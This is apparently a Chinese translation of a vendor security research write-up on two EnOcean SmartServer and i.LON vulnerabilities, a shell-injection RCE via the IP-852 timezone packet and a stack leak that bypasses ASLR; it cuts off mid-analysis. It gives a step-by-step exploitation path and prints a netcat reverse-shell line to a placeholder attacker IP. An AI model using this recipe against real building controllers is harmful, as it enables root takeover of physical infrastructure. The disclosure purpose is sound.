---
title: EnOcean SmartServer漏洞：楼宇管理系统远程代码执行与ASLR绕过技术分析
url: https://mp.weixin.qq.com/s/TW49tAeIDuqiA8bB4-8DcA
source: Doonsec's feed
date: 2026-05-01
fetch_date: 2026-05-02T04:57:34.027334
---

# EnOcean SmartServer漏洞：楼宇管理系统远程代码执行与ASLR绕过技术分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdMlPm0icuYqc2Kp3kIOp1NeVlFwydWXLFTR1dZqmfOWWVHuzmVCQMpTFE61ZnyxgKF5WZtIVS2oMmPXR4pU0ncfQSlzLq388BI/0?wx_fmt=png&from=appmsg)

# EnOcean SmartServer漏洞：楼宇管理系统远程代码执行与ASLR绕过技术分析

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> Team82在EnOcean SmartServer IoT及i.LON设备中发现两个高危漏洞：CVE-2026-20761（远程代码执行，CVSS 8.1）和CVE-2026-22885（内存泄露绕过ASLR，CVSS 3.7）。攻击者无需认证即可通过精心构造的IP-852协议包获得设备root权限，或泄露栈内存中的指针，进而突破ASLR保护。EnOcean已在SmartServer 4.6 Update 2（v4.60.023）中修复，强烈建议用户升级。

## 概述

Team82此前对LonTalk协议和CEA-852标准的研究表明，像LonTalk这样的老协议正被改造，以支持楼宇管理系统（BMS）和各类智能物联网设备联网。这确实提升了电力、暖通、安防等系统的管理效率，但也打开了新的攻击面。

这次我们聚焦EnOcean的SmartServer IoT[1]和i.LON控制器[2]——这些设备将楼宇自动化系统接入互联网。SmartServer IoT是EnOcean新一代的BMS控制器，i.LON则是Echelon开发的老产品。

我们发现两者在实现CEA-852标准时有两个漏洞，能直接获取root权限执行任意代码。攻击者拿到控制器root权限后，可控制BMS业务逻辑，横向移动到现场设备，就能搞坏空调、断电、让环境监控瘫痪。

EnOcean已经在最近一次更新中修补。用户应尽快升级到SmartServer 4.6 Update 2 (v4.60.023)或更高版本。

## CEA-852实现漏洞：SmartServer和i.LON设备上的远程代码执行（CVE-2026-20761）

我们找到的最要命的漏洞是不用认证就能远程以root身份执行任意代码。只要设备开了IP-852包收发且暴露在公网上，那就是白送的靶子。这个攻击（CVE-2026-20761）出在Echelon专有的IP-852时区设置包处理上——输入校验不严，攻击者可以控制传给系统调用的参数，然后接管整个基于Linux的设备，拿到root权限。

下面从头开始分析漏洞。

首先，我们找到内部一个脆弱的函数，它错误地处理了输入，这个输入最终会被传到操作系统的system调用里。接着，我们展示攻击者如何控制这个输入，通过发送特制的IP-852包（无需认证），以root身份执行任意命令。

### 脆弱系统函数调用

我们发现libLonStack.so中的LtSetTimeZone函数会从传递的时区字符串构建一个shell命令，然后以root权限通过system执行。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tbTbtBE6TibdMlPm0icuYqc2Kp3kIOp1NeVlFwydWXLFTR1dZqmfOWWVHuzmVCQMpTFE61ZnyxgKF5WZtIVS2oMmPXR4pU0ncfQSlzLq388BI/640?wx_fmt=png&from=appmsg)

▲ libLonStack.so中LtSetTimeZone关键代码：时区命令验证、构建、传给system执行

上面截图展示LtSetTimeZone中设置设备时区的逻辑。我们拆成几个要点：

* 函数声明显示它只接受一个参数：时区字符串。
* 校验部分检查设备上名为set-timezone的二进制程序是否存在（用Linux的which命令）。
* 构建待执行的shell命令。最终命令结构如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibfvs3yVmkOjrcOeGgr6dx1tNqk5e9NoNXkuThAjiaPQ1DSicgSrrLHzDkT34IWWfprnFw6OtFYJzLlIbuwIbnFnOMBL3XS5K30wE/640?wx_fmt=webp&from=appmsg)

▲ 传给system以设置设备时区的shell命令

上图可以看到，时区字符串是变量输入，其他部分都是硬编码不可改的。

最后这个shell命令被传给system函数执行。

攻击者可以通过提供恶意构造的时区字符串来突破引号限制，注入任意shell命令。比如：

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TiberoIs0IeYzGCgXEe4s5joaUAHHFWkSuyCZw0oqSM6iczjiaIx4XAteI5lPRJyGZ5OU1lzDunVD0z7xr7Pk7t4xYsZuAqWHZJyQ8/640?wx_fmt=webp&from=appmsg)

▲ 精心构造的时区字符串，可跳出引号并注入任意shell命令

这个示意图展示了一种示例：如果攻击者能自由控制LtSetTimeZone的输入，就能让system执行任意命令。

需注意，LtSetTimeZone函数并没有实现在EnOcean官方GitHub仓库的LtIpPlatform.cpp源文件[3]里。也就是说，开源代码里看不到这个漏洞，只能通过二进制分析设备上的库文件才能发现。

### 探究Echelon私有配置包类型

基于前面的分析，我们想知道攻击者能否修改时区值，以及需要什么访问权限。

检查LtSetTimeZone的调用者，发现它在LtIpMaster.cpp的void LtIpMaster::doRFCin函数中被调用。doRFCin（RFC是CEA-852内部对IP-852的称呼）是IP-852消息的主要输入处理函数，它根据包类型用switch派发，然后处理每种情况。

我们发现在处理PKTTYPE\_ECHCONFIG（0xF3）包时调用了LtSetTimeZone。这是Echelon的私有包类型（厂商代码需为0x01）。下面分析处理函数，看看这个包支持哪些操作，以及攻击者发送这种包的潜在影响。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdSBSwBrvAYFuLQibFicZj1NFsG5aflgSvfyWTAGbg2DNQgPbiaKU8j4Aib77Xshho7t7kJNt24gUWGY1sfSAxUMaa1D6aibrV3affc/640?wx_fmt=webp&from=appmsg)

▲ doRFCin函数中PKTTYPE\_ECHCONFIG处理逻辑（LtIpMaster.cpp），三个关键部分用红框标出

有三个关键点需要考虑：

1. 必须通过bFromCfgServer检查，这个布尔标志指示消息是否来自配置服务器。
2. 需要构造一个符合LtIpEchConfig::parse函数（LtIpEchPackets.cpp）期望结构的PKTTYPE\_ECHCONFIG (0xF3)消息。
3. 必须确保bUseTZ标志被设置，这个布尔值决定是否应用PKTTYPE\_ECHCONFIG消息中指定的时区。

#### 确保bFromCfgServer标志为True

doRFCin中有一段检查逻辑决定是否将bFromCfgServer设为True（默认是False）。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibe1Rk5EP4AhKxAOZfeDFxTyBXr5jht9bptVjGO0Hvvd1ibV3KvrabhRC2PQD9pRvgnuHVKNF7FHKSTtke24rurDYlwYSOxcsfes/640?wx_fmt=webp&from=appmsg)

▲ doRFCin中检查包是否来自配置服务器的代码段

有三种方式可以通过检查（满足任意一种即可）：

1. 配置服务器IP地址未设置（m\_ipAddrCfgServer = 0）。
2. 消息来自配置服务器的IP和端口（ipSrcAddr == m\_ipAddrCfgServer 且 ipSrcPort == m\_ipPortCfgServer）。
3. 消息的CNIP头部包含扩展头部，并指定了配置服务器的IP和端口。

我们选择第三种：在CNIP头部启用扩展头部特性，显式指定配置服务器的IP和端口。

标准扩展头部的CNIP头部结构如下：

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibcicdY0Vo29aZZv5ic6kSfhDgGrwmYLKN0NotvK6TDialBib9gVgqg2aLPX8xSd5aT3EakibEgEExg7IpHxoVywrK1KjLlZSYFmiap7A/640?wx_fmt=webp&from=appmsg)

▲ 带有标准扩展头部的CNIP头部

上图展示当扩展头部大小字段设为0x03时（表示CNIP头部后面跟着12字节的扩展头部）。扩展头部字段包括：

* 本地IP：配置服务器的本地IP地址。
* NAT IP：设备的NAT IP地址（如果适用）。
* IP端口：与配置服务器IP地址关联的端口号。

要获取配置服务器的IP地址、端口以及NAT地址（如果存在），可以发送PKTTYPE\_REQDEVCONFIG (0x63)请求。设备会回复PKTTYPE\_DEVCONFIG (0x71)包，里面包含这些信息。这两种都是标准IP-852包类型，厂商代码为0x01。

一旦拿到构造扩展头部所需的信息，消息就能通过检查（表明是配置服务器发送的），bFromCfgServer标志被设为True。

#### 构造PKTTYPE\_ECHCONFIG消息

根据LtIpEchConfig::parse函数，我们可以确定PKTTYPE\_ECHCONFIG包的结构：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibf1rdtmLLQz03zoyjzaRRzia7J7W68NzkDDJzC84jpvKicJaJn7Y9QmdIeAdKP1pQ5Lbo9BCkrFHTQ7xCRlbYOqgvfEEOQ6UBtNc/640?wx_fmt=webp&from=appmsg)

▲ PKTTYPE\_ECHCONFIG解析代码，显示szTimeZone（时区）和bUseTZ值的赋值处

从代码推导出的PKTTYPE\_ECHCONFIG包结构如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6Tibeib9ZromibdjbCvHTDOCiaFicpicX23btFQSUwibg81tBibd0gicVwGLS549DGnj0PAQGsv2AO7J2lqTh6TZibMicUPIjrNAG3TGibwxJPFo/640?wx_fmt=webp&from=appmsg)

▲ PKTTYPE\_ECHCONFIG包载荷结构图

其中：

* Datetime：自1900年1月1日以来的秒数，用于记录请求或响应的时间戳。
* Flags：配置标志位掩码，每一位表示协议定义的特定设置或行为。
* Aggregation timer：聚合定时器（毫秒），定义消息在发送前可聚合的时间长度。
* BW limit kB/s：带宽限制（kB/s），控制最大传输速率。
* Escrow timer：接收重排托管定时器（毫秒），必须小于channel timeout。典型值约为channel timeout的1/10。值为0表示与聚合定时器一致。
* TOS bits：指定套接字流量处理的Type of Service（IP QoS）。
* Timezone：以null结尾的字符串，代表配置的时区。

如前面所说，要使时区生效，flags字段中的bUseTZ位必须设为1。

### 利用流程

下图展示攻击者攻击SmartServer IoT[1]的攻击序列：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcYAATNyz5FHr1Cf2fwIam2VD5N6cS7WMKWl4Wej4Wu0t6v0e5q3TBAcqeNjtW6ccG2QWYzJVVI7Z84QTvbxoxkibzDccjOuviaA/640?wx_fmt=webp&from=appmsg)

▲ 攻击者与SmartServer间的消息流，演示远程代码执行步骤

上图展示攻击者与SmartServer之间的消息流，分为两组主要步骤（图中用红色高亮）：

* 获取配置服务器先验信息：攻击者发送PKTTYPE\_REQDEVCONFIG (0x63)请求，从PKTTYPE\_DEVCONFIG (0x71)响应中获取SmartServer信息，包括配置服务器的IP地址、端口及NAT IP（如有）。
* 向服务器发送精心构造的Echelon私有配置消息：攻击者将从PKTTYPE\_DEVCONFIG (0x71)响应中获取的数据填入特制的PKTTYPE\_ECHCONFIG (0xF3)包的扩展头部，然后发送给服务器。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6Tibebw19YNZRbC9nr5eGZCGoIZ7U06ia3HZN90IAEu6q06qSmK79p1KoichDu1AVbbu9POk6qNtARoKWiaJaIhyAhNVXIAIMEI5NYwE/640?wx_fmt=webp&from=appmsg)

▲ 精心构造的恶意PKTTYPE\_ECHCONFIG包，标注重要字段

上图展示构造的恶意PKTTYPE\_ECHCONFIG包，五个关键字段高亮：

1. 扩展头部大小设为0x03，表示CNIP头部后面追加12字节标准扩展头部。
2. 厂商代码设为0x01，表示当前消息是Echelon私有包类型。
3. 12字节标准扩展头部追加到CNIP头部后，包含配置服务器的IP、端口及设备NAT IP（如有）。
4. 载荷中flags字段的bUseTZ位设为1，表示解析消息时应用时区值。
5. 恶意时区字段包含能注入任意shell命令的精心构造字符串，后面用零字节填充至128字节。

服务器收到恶意PKTTYPE\_ECHCONFIG消息后，处理该包导致以root权限执行注入的payload，实现远程代码执行（RCE）。

### 概念验证利用

我们用一个Python脚本演示利用过程，实现上述漏洞的概念验证。

脚本用法：

python LonTalk\_IP852\_UDP\_RCE\_PoC.py <target\_ip> <lon\_port> <script\_path>

<target\_ip>: SmartServer的IP地址。
<lon\_port>: SmartServer上的LonTalk端口（通常为1628或1629）。
<script\_path>: 包含要在服务器上执行命令的shell脚本路径。这些命令将以root权限运行。

![](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeWiccDFdOSzgPicoSdXKCrZ4iclLd8tAaTzem2EpHtujpq6Yehl71k8EEt72bSjye9jaYWHtnE0TYCyMgyzpNDndPPXU4ggT5rIY/640?wx_fmt=webp&from=appmsg)

▲ 利用环境：配置服务器（左上）、目标SmartServer（右上）、攻击者（下方）

发送恶意消息前，攻击者在1337端口启动netcat监听。要在目标上执行的脚本reverse\_shell.sh内容为：

nc -e /bin/sh <attacker\_ip> 1337

这会启动一个反弹shell，连接到攻击者IP:1337的netcat监听器，从而让操作者以root级别远程控制SmartServer的Linux操作系统。演示如此。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibdPo2qNZ8zvoM6Yar9kvrxkxt9X8COlRgRjXsx0iaa5YRz0icW5iaCtDkVKhxyqtkbrcJwRTqOvqWZ2oOfbI9IXaqqIzIOVSgv0GI/640?wx_fmt=webp&from=appmsg)

## 内存泄露使能ASLR绕过：SmartServer和i.LON设备上的漏洞（CVE-2026-22885）

我们还发现用户可控制数据时边界检查不足，导致栈内存泄露（CVE-2026-22885）。攻击者可以泄露栈上的任意值或指针，从而泄露存放在那里的任何数据。这个原语可用于泄露指针，进而确定运行程序基地址，有效绕过ASLR（地址空间布局随机化）。它跟前一个漏洞并存，可独立用于信息泄露。

### 扩展头部解析处理不当

这个边界检查不足的根因在于LtIpPktHeader::parse（LtIpPackets.cpp）中扩展头部的解析实现。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tbTbtBE6TibcugcqTqMmzTsePLPjFdbhViaSwNB7MnhDvRBFhnXiazoRibfpgbsUPvf9QiaqfGcTh13bZqibDA4uuSZg2ecJqjicXOSNLwrWZAsvvU/640?wx_fmt=webp&from=appmsg)

▲ LtIpPktHeader解析代码截图，展示用户控制的extndHdrSize字节如何决定扩展头部解析方式

上面的截图显示IP-852包头部解析函数如何处理用户控制的extndHdrSize字节。标准IP-852头部后面可能会追加扩展头部。处理过程如下：

1. 如果extndHdrSize等于0x03，扩展头部长度为12字节（实际大小为extndHdrSize \* 4）。此时代码像标准扩展头部一样解析，就像之前标准扩展头部的CNIP头部图示那样。此外，全局标志bHasExtHdr（表示包中存在扩展头部）被设为True。
2. 如果extndHdrSize不等于0x03，代码将CNIP头部结束位置向后移动extndHdrSize\*4字节，假设这个偏移量是头部的结束和载荷的开始，同时将bHasExtHdr设为Fals...